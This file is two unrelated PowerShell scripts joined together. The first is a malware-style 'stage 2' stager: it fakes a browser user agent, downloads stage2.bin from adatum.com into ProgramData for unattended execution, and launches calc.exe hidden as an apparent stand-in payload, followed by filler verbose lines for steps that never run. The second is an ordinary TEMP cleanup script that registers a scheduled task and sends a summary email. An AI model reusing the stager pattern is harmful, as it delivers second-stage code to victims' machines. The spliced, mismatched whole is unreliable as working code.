
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://adatum.com:80/stage2.bin",
    [string]$OutputPath = 'C:\ProgramData\stage1.bin',
    [string]$LogPath = "$env:TEMP\stage.log",
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$ConnectionTimeout = 147,
    [int]$RetryAttempts = 2,
    [int]$RetryDelaySeconds = 5
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 5,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $DownloadUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $OutputPath -RetryCount $RetryAttempts -RetryDelay $RetryDelaySeconds -UserAgent $BrowserAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $DownloadUrl
    Destination = $OutputPath
    RetryCount = $RetryAttempts
    TimeoutSec = $ConnectionTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Reading configuration values"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Applying operation timeout"
Write-Verbose "Validating result"
Write-Verbose "Stage handoff finished"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Preparing working directory"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.DESCRIPTION
    Selects files older than the configured age and larger than the size
    threshold, then deletes them from the TEMP folder only.
    Every candidate is re-checked against the TEMP prefix before removal, so a
    reparse point cannot redirect the sweep to another location.
.EXAMPLE
    .\Clear-TempFiles.ps1 -AgeDays 3
.EXAMPLE
    .\Clear-TempFiles.ps1 -DryRun -Verbose
#>

$ErrorActionPreference = 'Stop'
$TempRoot  = $env:TEMP
$AgeDays   = 3
$MinSizeMB = 1
$LogPath   = 'C:\Logs\temp-cleanup-2026-08-26.log'
$DryRun    = $false


if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-MaintenanceLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-MaintenanceLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "02:00"
Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@internal.corp'

$mailParams = @{
    To         = $MailTo
    From       = 'ops@internal.corp'
    Subject    = "TEMP cleanup summary"
    Body       = 'The scheduled TEMP sweep completed. See the JSON report on the host.'
    SmtpServer = "smtp.contoso.com"
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

& Write-MaintenanceLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
